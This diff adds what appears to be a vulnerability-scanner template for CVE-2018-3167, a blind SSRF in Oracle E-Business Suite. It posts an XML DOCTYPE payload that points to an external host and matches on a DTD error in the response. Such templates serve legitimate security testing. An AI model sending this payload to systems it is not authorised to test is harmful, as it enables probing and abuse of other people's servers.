@@ -1,0 +1,38 @@
+[info]
+author = "ave"
+description = "验证 Oracle E-Business Suite Application Management Pack 中 lcmServiceController.jsp 的盲 SSRF 漏洞，通过 POST 请求发送包含恶意 DOCTYPE 的 XML 载荷触发服务端向外部 URL 发起请求，检测响应中是否返回 Unexpected text in DTD 错误信息"
+id = "POC-AVE-2018-0176"
+name = "CVE-2018-3167 PoC"
+severity = "medium"
+tags = ["ave-2018-0176"]
+vuln_id = [
+    "CVE-2018-3167",
+    "AVE-2018-0176",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/OA_HTML/lcmServiceController.jsp"
+protocol = "http"
+
+[poc.requests.body]
+content = '<!DOCTYPE root PUBLIC "-//B/A/EN" "http://interact.sh">'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Unexpected text in DTD"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
